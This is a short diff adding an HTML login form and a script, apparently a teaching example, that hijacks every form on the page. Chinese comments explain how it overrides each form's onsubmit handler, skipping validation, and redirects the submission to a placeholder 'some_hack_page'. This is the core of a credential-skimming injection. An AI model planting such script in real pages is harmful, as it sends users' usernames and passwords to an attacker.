@@ -1,0 +1,17 @@
+<form action="?user=akira">
+	UserName:<input></input>
+	Password:<input></input>
+	<input type="submit"/>
+</form>
+<script>
+for(var i = 0; i < document.forms.length; i++)
+{
+	//这段脚本直接覆盖了表单的onSubmit方法，在原始表单上增加的格式校验可能不再有效
+	document.forms[i].onsubmit = function()
+	{
+		this.action = "some_hack_page";
+		return true;
+		//直接返回true将让表单立即被提交，而提交地址，也被上面的代码篡改为some_hace_page
+	}
+}
+</script>
